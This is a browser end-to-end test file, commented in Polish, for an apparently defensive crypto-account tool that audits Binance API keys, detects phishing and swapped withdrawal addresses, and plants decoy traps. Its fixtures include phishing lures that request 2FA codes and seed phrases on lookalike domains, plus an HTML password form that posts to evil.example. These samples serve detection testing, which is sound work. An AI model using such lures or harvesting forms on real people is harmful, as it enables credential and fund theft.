// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Robi (@robi44610)
// Test e2e Binance Guard w przeglądarce bez okna (playwright-core + systemowy Chrome). Relay jest podmieniany
// w przeglądarce (page.route), więc test nie łączy się z Binance. Uruchom: BASE=http://127.0.0.1:8080 node tests/e2e_binance.js
"use strict";
const { chromium } = require("playwright-core");
const fs = require("fs");
const assert = require("assert");
const BASE = process.env.BASE || "http://127.0.0.1:8080";
const OUT = process.env.OUT || "";
const CHROME = process.env.CHROME || "/usr/bin/google-chrome";
const KEY = "E2EKEY" + "x".repeat(58), SECRET = "E2ESECRET" + "y".repeat(55);
let ok = 0, bad = 0;
async function t(name, fn) { try { await fn(); ok++; console.log("OK   " + name); } catch (e) { bad++; console.log("FAIL " + name + ": " + e.message); } }

(async () => {
  const browser = await chromium.launch({ executablePath: CHROME, args: ["--no-sandbox"] });
  const errors = [];
  const ctx = await browser.newContext({ locale: "pl-PL", viewport: { width: 1200, height: 900 } });
  const page = await ctx.newPage();
  page.on("pageerror", e => errors.push("pageerror: " + e.message));
  page.on("console", m => { if (m.type() === "error") errors.push("console: " + m.text()); });
  const bodies = [];
  let addrList = [{ coin: "BTC", network: "BTC", address: "bc1qsafe", addressTag: "", name: "Ledger", whiteStatus: true, origin: "", originType: "" }];
  await page.route("**/api/binance/relay", async route => {
    const b = route.request().postData(); bodies.push(b);
    const j = JSON.parse(b);
    const data = { time: { serverTime: Date.now() },
      apiRestrictions: { ipRestrict: false, createTime: Date.now() - 500 * 86400000, enableWithdrawals: true, enableInternalTransfer: false,
        permitsUniversalTransfer: false, enableVanillaOptions: false, enableReading: true, enableFutures: true, enableMargin: false,
        enableSpotAndMarginTrading: false, tradingAuthorityExpirationTime: 0 },
      accountStatus: { data: "Normal" }, apiTradingStatus: { data: { isLocked: false } }, withdrawAddressList: addrList }[j.endpoint];
    await route.fulfill({ status: 200, contentType: "application/json", headers: { "X-BG-Relay": "server" }, body: JSON.stringify({ data }) });
  });

  await page.goto(BASE + "/binance");
  await t("język z przeglądarki (pl)", async () => assert.match(await page.textContent("h1"), /Zamknij swoje konto/));
  await t("zastrzeżenie widoczne", async () => assert.match(await page.textContent("#disclaimer"), /nie jest powiązane z Binance/i));
  await page.fill("#apiKey", KEY); await page.fill("#apiSecret", SECRET);
  await page.click("#runAudit");
  await page.waitForSelector("#auditOut .findings li");
  await t("audyt: krytyczne przy włączonych wypłatach", async () => { const s = await page.textContent("#auditOut"); assert.match(s, /KRYTYCZNE/); assert.match(s, /Wypłaty przez API są WŁĄCZONE/); assert.match(s, /kontrakty futures/); assert.match(s, /500 dni/); });
  await t("sekret nigdy nie wysłany", async () => { assert.ok(bodies.length >= 3); for (const b of bodies) { assert.ok(!b.includes(SECRET)); assert.ok(!b.includes("ESECRET")); } assert.ok(bodies.some(b => /"signature":"[0-9a-f]{64}"/.test(b))); });
  await t("sekret nie trafia do localStorage", async () => assert.ok(!(await page.evaluate(() => JSON.stringify(localStorage))).includes("ESECRET")));
  if (OUT) await page.screenshot({ path: OUT + "binance-audit-pl.png", fullPage: true });

  await page.click("#tab-guard");
  await page.click("#fetchAddr"); await page.waitForSelector("#addrOut table");
  await page.click("#saveBase");
  await t("baseline zapisany (skróty, bez adresu)", async () => { const v = await page.evaluate(() => localStorage.getItem("bg.baseline.v1")); assert.ok(v && !v.includes("bc1qsafe")); });
  addrList = [{ coin: "BTC", network: "BTC", address: "bc1qATTACKER", addressTag: "", name: "Ledger", whiteStatus: true }];
  await page.click("#fetchAddr"); await page.waitForSelector("#diffOut .diff-alert");
  await t("strażnik wykrywa podmieniony adres", async () => assert.match(await page.textContent("#diffOut"), /bc1qATTACKER/));
  if (OUT) await page.screenshot({ path: OUT + "binance-guard-pl.png", fullPage: true });

  await page.click("#tab-detect");
  await page.fill("#detIn", "Pilne! Twoje konto Binance zostanie zablokowane w ciągu 24 godzin. Podaj kod 2FA: http://binance-verify.top/login");
  await page.click("#runDetect");
  await t("wykrywacz: krytyczne", async () => { const s = await page.textContent("#detOut"); assert.match(s, /KRYTYCZNE/); assert.match(s, /binance-verify\.top/); });
  await page.click('.lang[data-lang="zh"]');
  await t("przełącznik na chiński tłumaczy też wyniki", async () => { assert.match(await page.textContent("h1"), /锁好/); assert.match(await page.textContent("#detOut"), /严重/); });
  if (OUT) await page.screenshot({ path: OUT + "binance-detect-zh.png", fullPage: true });
  await page.reload();
  await t("wybór języka zapamiętany", async () => assert.match(await page.textContent("h1"), /锁好/));
  await page.click('.lang[data-lang="en"]');
  await t("angielski", async () => assert.match(await page.textContent("h1"), /Lock down/));
  await page.click("#tab-audit");
  await page.click('label.chip:has(input[value=manual]) span');
  await page.click("#c-chk_2fa");
  await t("lista ręczna liczy i zapamiętuje", async () => { assert.match(await page.textContent("#manualScore"), /1 of 14/); await page.reload(); await page.click('label.chip:has(input[value=manual]) span'); assert.match(await page.textContent("#manualScore"), /1 of 14/); });

  // brak podmiany relay: prawdziwy serwer (np. w USA -> 451) – komunikat musi być zrozumiały
  const p2 = await (await browser.newContext({ locale: "en-US" })).newPage();
  p2.on("pageerror", e => errors.push("pageerror2: " + e.message));
  await p2.goto(BASE + "/binance#audit");
  await p2.fill("#apiKey", KEY); await p2.fill("#apiSecret", SECRET); await p2.click("#runAudit");
  await p2.waitForFunction(() => document.getElementById("auditErr").classList.contains("on") || document.querySelector("#auditOut li"), null, { timeout: 30000 });
  await t("prawdziwy relay: czytelny wynik albo błąd", async () => { const s = await p2.textContent("#auditErr"); console.log("     relay: " + s.slice(0, 160)); assert.ok(s.length > 10 || (await p2.textContent("#auditOut")).length > 10); });
  if (OUT) await p2.screenshot({ path: OUT + "binance-relay-en.png", fullPage: true });
  // --- moduł 4: RE + Blue Team (prawdziwy lokalny serwer, syntetyczne próbki) ---
  const p3 = await (await browser.newContext({ locale: "pl-PL", acceptDownloads: true })).newPage();
  p3.on("pageerror", e => errors.push("pageerror3: " + e.message));
  p3.on("console", m => { if (m.type() === "error") errors.push("console3: " + m.text()); });
  await p3.goto(BASE + "/binance#blue");
  await t("RE: zakładka i panel klucza ukryty", async () => { assert.ok(await p3.isVisible("#sec-blue")); assert.ok(!(await p3.isVisible("#apiSecret"))); });
  await p3.fill("#reText", "Pilne! Binance: zweryfikuj konto, wpisz seed phrase na http://xn--binnce-6va.com/login");
  await p3.click("#reRun");
  await p3.waitForSelector("#reOut .findings li", { timeout: 15000 });
  await t("RE: wynik z hashami, VT i wskaźnikami", async () => { const s = await p3.textContent("#reOut"); assert.match(s, /SHA-256/); assert.match(s, /VirusTotal/); assert.match(s, /seed/i); assert.match(s, /xn--binnce-6va\.com/); });
  await p3.setInputFiles("#reFile", { name: "sample.html", mimeType: "text/html", buffer: Buffer.from('<form action="https://evil.example/x"><input type="password" name="p"></form>') });
  await p3.click("#reRun");
  await p3.waitForFunction(() => /HTML/.test(document.getElementById("reOut").textContent), null, { timeout: 15000 });
  await t("RE: plik HTML z formularzem hasła", async () => assert.match(await p3.textContent("#reOut"), /hasł/i));
  if (OUT) await p3.screenshot({ path: OUT + "binance-re-pl.png", fullPage: true });
  await p3.fill("#trapLabel", "e2e laptop");
  await p3.click("#trapNew");
  await p3.waitForSelector("#trapOut .copybox", { timeout: 15000 });
  const viewUrl = (await p3.locator("#trapOut .copybox").first().textContent()).trim();
  const bugUrl = (await p3.locator("#trapOut .copybox").nth(1).textContent()).trim();
  await t("pułapka: link panelu w #fragmencie i URL aliasu", async () => { assert.match(viewUrl, /\/binance#trap=[0-9a-f]{20}\./); assert.match(bugUrl, /\/t\/[0-9a-f]{20}\//); });
  const [dl] = await Promise.all([p3.waitForEvent("download"), p3.locator("#trapOut a[download]").first().click()]);
  const dtxt = fs.readFileSync(await dl.path(), "utf8");
  await t("pułapka: plik-wabik z nieaktywnymi kluczami SZLD i aliasem", async () => { assert.match(dtxt, /SZLD/); assert.match(dtxt, /\/t\/[0-9a-f]{20}/); });
  await (await fetch(bugUrl, { headers: { "User-Agent": "E2E-Intruder" } })).text();
  await p3.locator("#trapList .trapcard button").first().click();
  await p3.waitForFunction(() => /E2E-Intruder/.test(document.getElementById("trapList").textContent), null, { timeout: 15000 });
  await t("pułapka: trafienie widoczne w panelu", async () => assert.match(await p3.textContent("#trapList"), /E2E-Intruder/));
  const p4 = await (await browser.newContext({ locale: "zh-CN" })).newPage();
  p4.on("pageerror", e => errors.push("pageerror4: " + e.message));
  await p4.goto(viewUrl);
  await p4.waitForFunction(() => /E2E-Intruder/.test(document.getElementById("trapList").textContent), null, { timeout: 15000 });
  await t("pułapka: link panelu działa w innej przeglądarce (zh)", async () => assert.match(await p4.textContent("#trapList"), /E2E-Intruder/));
  await (await fetch(BASE + "/.env", { headers: { "User-Agent": "E2E-Scanner" } })).text();
  await p3.click("#hardLoad");
  await p3.waitForSelector("#hardOut table", { timeout: 15000 });
  await t("raport utwardzenia: skan frontendu + trafienia wabików", async () => { const s = await p3.textContent("#hardOut"); assert.match(s, /\/\.env/); assert.match(s, /E2E-Scanner/); });
  if (OUT) await p3.screenshot({ path: OUT + "binance-blue-pl.png", fullPage: true });
  await p4.click("#tab-audit"); await p4.click('label.chip:has(input[value=manual]) span');
  await t("lista: sekcja telefonu po chińsku z linkami Apple", async () => { const s = await p4.textContent("#checklist"); assert.match(s, /伪基站/); assert.ok(await p4.locator('#checklist a[href="https://support.apple.com/en-us/105120"]').count() === 1); });
  if (OUT) await p4.screenshot({ path: OUT + "binance-checklist-zh.png", fullPage: true });
  const mob = await (await browser.newContext({ locale: "en-US", viewport: { width: 390, height: 844 }, isMobile: true })).newPage();
  await mob.goto(BASE + "/binance#detect");
  await t("mobile: brak poziomego przewijania", async () => assert.ok(await mob.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1)));
  if (OUT) await mob.screenshot({ path: OUT + "binance-mobile.png", fullPage: true });
  await t("brak błędów JS / CSP", async () => assert.deepStrictEqual(errors.filter(e => !/451|Failed to load resource/.test(e)), []));
  await browser.close();
  console.log("wynik: " + ok + " OK, " + bad + " FAIL");
  process.exit(bad ? 1 : 0);
})();
